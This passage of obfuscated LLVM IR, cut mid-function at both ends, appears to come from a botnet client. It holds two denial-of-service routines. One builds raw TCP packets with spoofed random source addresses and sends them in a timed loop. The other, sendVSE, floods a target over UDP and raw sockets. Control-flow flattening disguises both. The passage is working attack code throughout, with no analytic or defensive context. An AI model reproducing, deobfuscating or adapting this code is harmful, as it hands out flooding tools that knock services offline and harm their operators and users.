  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %23 = load i32, i32* %12, align 4
  store i32 %23, i32* %13, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1511622591, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1511622591, label %first
    i32 1206018486, label %28
    i32 -1724299284, label %32
    i32 -934096473, label %37
    i32 720967741, label %43
    i32 1619971240, label %44
    i32 -1773069676, label %51
    i32 1299062028, label %52
    i32 1978860508, label %58
    i32 1508900988, label %59
    i32 1059781386, label %63
    i32 26068665, label %64
    i32 -834808306, label %70
    i32 372123499, label %151
    i32 -106690184, label %153
    i32 -1272801994, label %158
    i32 712882205, label %182
    i32 -427383249, label %183
    i32 823300886, label %230
    i32 -561016223, label %235
    i32 857060823, label %236
    i32 1741459712, label %237
    i32 -1780889930, label %240
    i32 -1017786826, label %242
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 0
  %27 = select i1 %26, i32 1206018486, i32 -1724299284
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  store i32 -934096473, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %8, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #13
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 -934096473, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %7, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %40 = call i32 @getHost(i8* %38, %struct.in_addr* %39)
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 720967741, i32 1619971240
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1017786826, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 8, i32 4, i1 false)
  %47 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %47, i32* %15, align 4
  %48 = load i32, i32* %15, align 4
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 1299062028, i32 -1773069676
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -1017786826, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  %53 = load i32, i32* %15, align 4
  %54 = bitcast i32* %16 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #2
  %56 = icmp slt i32 %55, 0
  %57 = select i1 %56, i32 1978860508, i32 1508900988
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -1017786826, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %10, align 4
  %61 = icmp eq i32 %60, 0
  %62 = select i1 %61, i32 1059781386, i32 26068665
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 0, i32* %17, align 4
  store i32 -834808306, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %10, align 4
  %66 = sub nsw i32 32, %65
  %67 = shl i32 1, %66
  %68 = sub nsw i32 %67, 1
  %69 = xor i32 %68, -1
  store i32 %69, i32* %17, align 4
  store i32 -834808306, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %11, align 4
  %72 = sext i32 %71 to i64
  %73 = add i64 40, %72
  store i64 %73, i64* %.reg2mem2
  %74 = call i8* @llvm.stacksave()
  store i8* %74, i8** %18, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %75 = alloca i8, i64 %.reload4, align 16
  store i8* %75, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %76 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %76, %struct.iphdr** %19, align 8
  %77 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %78 = bitcast %struct.iphdr* %77 to i8*
  %79 = getelementptr i8, i8* %78, i64 20
  %80 = bitcast i8* %79 to %struct.tcphdr*
  store %struct.tcphdr* %80, %struct.tcphdr** %20, align 8
  %81 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %82 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %83 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %82, i32 0, i32 0
  %84 = load i32, i32* %83, align 4
  %85 = load i32, i32* %17, align 4
  %86 = call i32 @GetRandomIP(i32 %85)
  %87 = call i32 @htonl(i32 %86) #13
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = add i64 20, %89
  %91 = trunc i64 %90 to i32
  call void @makeIPPacket(%struct.iphdr* %81, i32 %84, i32 %87, i8 zeroext 6, i32 %91)
  %92 = call zeroext i16 @htons(i16 zeroext 5678) #13
  %93 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %94 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %93, i32 0, i32 0
  %95 = bitcast %union.anon.0* %94 to %struct.anon.1*
  %96 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %95, i32 0, i32 0
  store i16 %92, i16* %96, align 4
  %97 = call i32 @rand() #2
  %98 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %99 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %98, i32 0, i32 0
  %100 = bitcast %union.anon.0* %99 to %struct.anon.1*
  %101 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %100, i32 0, i32 2
  store i32 %97, i32* %101, align 4
  %102 = call i32 @rand_cmwc()
  %103 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %104 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %103, i32 0, i32 0
  %105 = bitcast %union.anon.0* %104 to %struct.anon.1*
  %106 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %105, i32 0, i32 3
  store i32 %102, i32* %106, align 4
  %107 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %108 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %107, i32 0, i32 0
  %109 = bitcast %union.anon.0* %108 to %struct.anon.1*
  %110 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %109, i32 0, i32 4
  %111 = load i16, i16* %110, align 4
  %112 = and i16 %111, 16383
  store i16 %112, i16* %110, align 4
  %113 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %114 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %113, i32 0, i32 0
  %115 = bitcast %union.anon.0* %114 to %struct.anon.1*
  %116 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %115, i32 0, i32 4
  %117 = load i16, i16* %116, align 4
  %118 = and i16 %117, -241
  %119 = or i16 %118, 80
  store i16 %119, i16* %116, align 4
  %120 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.0* %121 to %struct.anon.1*
  %123 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -513
  %126 = or i16 %125, 512
  store i16 %126, i16* %123, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -4097
  %133 = or i16 %132, 4096
  store i16 %133, i16* %130, align 4
  %134 = call i32 @rand_cmwc()
  %135 = trunc i32 %134 to i16
  %136 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon.0* %137 to %struct.anon.1*
  %139 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %138, i32 0, i32 5
  store i16 %135, i16* %139, align 2
  %140 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.0* %141 to %struct.anon.1*
  %143 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %142, i32 0, i32 6
  store i16 0, i16* %143, align 4
  %144 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon.0* %145 to %struct.anon.1*
  %147 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %146, i32 0, i32 7
  store i16 0, i16* %147, align 2
  %148 = load i32, i32* %8, align 4
  %149 = icmp eq i32 %148, 0
  %150 = select i1 %149, i32 372123499, i32 -106690184
  store i32 %150, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = call i32 @rand_cmwc()
  store i32 -1272801994, i32* %switchVar
  store i32 %152, i32* %.reg2mem10
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %8, align 4
  %155 = trunc i32 %154 to i16
  %156 = call zeroext i16 @htons(i16 zeroext %155) #13
  %157 = zext i16 %156 to i32
  store i32 -1272801994, i32* %switchVar
  store i32 %157, i32* %.reg2mem10
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %159 = trunc i32 %.reload11 to i16
  %160 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %161 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %160, i32 0, i32 0
  %162 = bitcast %union.anon.0* %161 to %struct.anon.1*
  %163 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %162, i32 0, i32 1
  store i16 %159, i16* %163, align 2
  %164 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %165 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %166 = call zeroext i16 @tcpcsum(%struct.iphdr* %164, %struct.tcphdr* %165)
  %167 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon.0* %168 to %struct.anon.1*
  %170 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %169, i32 0, i32 6
  store i16 %166, i16* %170, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %171 = bitcast i8* %.reload8 to i16*
  %172 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 2
  %174 = load i16, i16* %173, align 2
  %175 = zext i16 %174 to i32
  %176 = call zeroext i16 @csum(i16* %171, i32 %175)
  %177 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 7
  store i16 %176, i16* %178, align 2
  %179 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %180 = load i32, i32* %9, align 4
  %181 = add nsw i32 %179, %180
  store i32 %181, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 712882205, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  store i32 -427383249, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i32, i32* %15, align 4
  %185 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %186 = call i64 @sendto(i32 %184, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %185, i32 16)
  %187 = load i32, i32* %17, align 4
  %188 = call i32 @GetRandomIP(i32 %187)
  %189 = call i32 @htonl(i32 %188) #13
  %190 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 8
  store i32 %189, i32* %191, align 4
  %192 = call i32 @rand_cmwc()
  %193 = trunc i32 %192 to i16
  %194 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 3
  store i16 %193, i16* %195, align 4
  %196 = call i32 @rand_cmwc()
  %197 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 0
  %199 = bitcast %union.anon.0* %198 to %struct.anon.1*
  %200 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %199, i32 0, i32 2
  store i32 %196, i32* %200, align 4
  %201 = call i32 @rand_cmwc()
  %202 = trunc i32 %201 to i16
  %203 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon.0* %204 to %struct.anon.1*
  %206 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %205, i32 0, i32 0
  store i16 %202, i16* %206, align 4
  %207 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %208 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %207, i32 0, i32 0
  %209 = bitcast %union.anon.0* %208 to %struct.anon.1*
  %210 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %209, i32 0, i32 6
  store i16 0, i16* %210, align 4
  %211 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %212 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %213 = call zeroext i16 @tcpcsum(%struct.iphdr* %211, %struct.tcphdr* %212)
  %214 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 6
  store i16 %213, i16* %217, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %218 = bitcast i8* %.reload6 to i16*
  %219 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 2
  %221 = load i16, i16* %220, align 2
  %222 = zext i16 %221 to i32
  %223 = call zeroext i16 @csum(i16* %218, i32 %222)
  %224 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 7
  store i16 %223, i16* %225, align 2
  %226 = load i32, i32* %22, align 4
  %227 = load i32, i32* %13, align 4
  %228 = icmp eq i32 %226, %227
  %229 = select i1 %228, i32 823300886, i32 1741459712
  store i32 %229, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %232 = load i32, i32* %21, align 4
  %233 = icmp sgt i32 %231, %232
  %234 = select i1 %233, i32 -561016223, i32 857060823
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  store i32 -1780889930, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 712882205, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i32, i32* %22, align 4
  %239 = add i32 %238, 1
  store i32 %239, i32* %22, align 4
  store i32 712882205, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %241)
  store i32 -1017786826, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %240, %237, %236, %235, %230, %183, %182, %158, %153, %151, %70, %64, %63, %59, %58, %52, %51, %44, %43, %37, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendVSE(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.sockaddr_in, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.udphdr*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i32 0, i32 0), i8** %17, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %10, align 4
  store i32 %37, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 550442896, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 550442896, label %first
    i32 1567318378, label %40
    i32 -2044320190, label %44
    i32 -1956841740, label %49
    i32 1024053181, label %55
    i32 441057899, label %56
    i32 268180211, label %63
    i32 -1199458123, label %68
    i32 -1873859205, label %69
    i32 -1093310617, label %77
    i32 538513175, label %78
    i32 -1817458015, label %88
    i32 622993952, label %99
    i32 1451836927, label %103
    i32 -1036110583, label %107
    i32 -849826677, label %112
    i32 729277102, label %113
    i32 1965083053, label %114
    i32 912427579, label %121
    i32 -1621717671, label %125
    i32 -1487152572, label %128
    i32 -867236745, label %129
    i32 1890459467, label %134
    i32 -1401229813, label %135
    i32 1086616560, label %141
    i32 980812804, label %142
    i32 310154262, label %143
    i32 1466975515, label %148
    i32 -1138485496, label %153
    i32 -1249276141, label %157
    i32 663493225, label %158
    i32 -967110179, label %164
    i32 -1529211841, label %207
    i32 -1783805555, label %209
    i32 -1384390449, label %214
    i32 972089537, label %256
    i32 -1529280874, label %257
    i32 1371958244, label %274
    i32 590742126, label %276
    i32 818037370, label %281
    i32 1094731620, label %308
    i32 -464397470, label %313
    i32 1304715628, label %314
    i32 -91503895, label %315
    i32 1168140421, label %322
    i32 -150929849, label %326
    i32 -1117707729, label %329
    i32 1012391758, label %331
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %38 = icmp eq i32 %.reload, 0
  %39 = select i1 %38, i32 1567318378, i32 -2044320190
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = call i32 @rand_cmwc()
  %42 = trunc i32 %41 to i16
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %42, i16* %43, align 2
  store i32 -1956841740, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %10, align 4
  %46 = trunc i32 %45 to i16
  %47 = call zeroext i16 @htons(i16 zeroext %46) #13
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %47, i16* %48, align 2
  store i32 -1956841740, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8*, i8** %9, align 8
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  %52 = call i32 @getHost(i8* %50, %struct.in_addr* %51)
  %53 = icmp ne i32 %52, 0
  %54 = select i1 %53, i32 1024053181, i32 441057899
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 1012391758, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 3
  %58 = getelementptr inbounds [8 x i8], [8 x i8]* %57, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %58, i8 0, i64 8, i32 4, i1 false)
  %59 = load i32, i32* %14, align 4
  store i32 %59, i32* %20, align 4
  %60 = load i32, i32* %12, align 4
  %61 = icmp eq i32 %60, 32
  %62 = select i1 %61, i32 268180211, i32 -867236745
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %64, i32* %21, align 4
  %65 = load i32, i32* %21, align 4
  %66 = icmp ne i32 %65, 0
  %67 = select i1 %66, i32 -1873859205, i32 -1199458123
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 1012391758, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %13, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  %73 = call noalias i8* @malloc(i64 %72) #2
  store i8* %73, i8** %22, align 8
  %74 = load i8*, i8** %22, align 8
  %75 = icmp eq i8* %74, null
  %76 = select i1 %75, i32 -1093310617, i32 538513175
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 1012391758, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %22, align 8
  %80 = load i32, i32* %13, align 4
  %81 = add nsw i32 %80, 1
  %82 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 %82, i32 1, i1 false)
  %83 = load i8*, i8** %22, align 8
  %84 = load i32, i32* %13, align 4
  call void @RandString(i8* %83, i32 %84)
  %85 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %86 = load i32, i32* %11, align 4
  %87 = add nsw i32 %85, %86
  store i32 %87, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -1817458015, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %21, align 4
  %90 = load i8*, i8** %22, align 8
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %94 = call i64 @sendto(i32 %89, i8* %90, i64 %92, i32 0, %struct.sockaddr* %93, i32 16)
  %95 = load i32, i32* %24, align 4
  %96 = load i32, i32* %20, align 4
  %97 = icmp eq i32 %95, %96
  %98 = select i1 %97, i32 622993952, i32 1965083053
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %10, align 4
  %101 = icmp eq i32 %100, 0
  %102 = select i1 %101, i32 1451836927, i32 -1036110583
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %105, i16* %106, align 2
  store i32 -1036110583, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %109 = load i32, i32* %23, align 4
  %110 = icmp sgt i32 %108, %109
  %111 = select i1 %110, i32 -849826677, i32 729277102
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  store i32 -1487152572, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 0, i32* %24, align 4
  store i32 -1817458015, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %24, align 4
  %116 = add i32 %115, 1
  store i32 %116, i32* %24, align 4
  %117 = load i32, i32* %25, align 4
  %118 = load i32, i32* %15, align 4
  %119 = icmp eq i32 %117, %118
  %120 = select i1 %119, i32 912427579, i32 -1621717671
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %16, align 4
  %123 = mul nsw i32 %122, 1000
  %124 = call i32 @usleep(i32 %123)
  store i32 0, i32* %25, align 4
  store i32 -1817458015, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %25, align 4
  %127 = add i32 %126, 1
  store i32 %127, i32* %25, align 4
  store i32 -1817458015, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 1012391758, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %130, i32* %26, align 4
  %131 = load i32, i32* %26, align 4
  %132 = icmp ne i32 %131, 0
  %133 = select i1 %132, i32 -1401229813, i32 1890459467
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  store i32 1012391758, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  store i32 1, i32* %27, align 4
  %136 = load i32, i32* %26, align 4
  %137 = bitcast i32* %27 to i8*
  %138 = call i32 @setsockopt(i32 %136, i32 0, i32 3, i8* %137, i32 4) #2
  %139 = icmp slt i32 %138, 0
  %140 = select i1 %139, i32 1086616560, i32 980812804
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  store i32 1012391758, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  store i32 50, i32* %28, align 4
  store i32 310154262, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i32, i32* %28, align 4
  %145 = add nsw i32 %144, -1
  store i32 %145, i32* %28, align 4
  %146 = icmp ne i32 %144, 0
  %147 = select i1 %146, i32 1466975515, i32 -1138485496
  store i32 %147, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %150 = call i32 @rand_cmwc()
  %151 = xor i32 %149, %150
  call void @srand(i32 %151) #2
  %152 = call i32 @rand() #2
  call void @init_rand(i32 %152)
  store i32 310154262, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %12, align 4
  %155 = icmp eq i32 %154, 0
  %156 = select i1 %155, i32 -1249276141, i32 663493225
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i32 -967110179, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i32, i32* %12, align 4
  %160 = sub nsw i32 32, %159
  %161 = shl i32 1, %160
  %162 = sub nsw i32 %161, 1
  %163 = xor i32 %162, -1
  store i32 %163, i32* %29, align 4
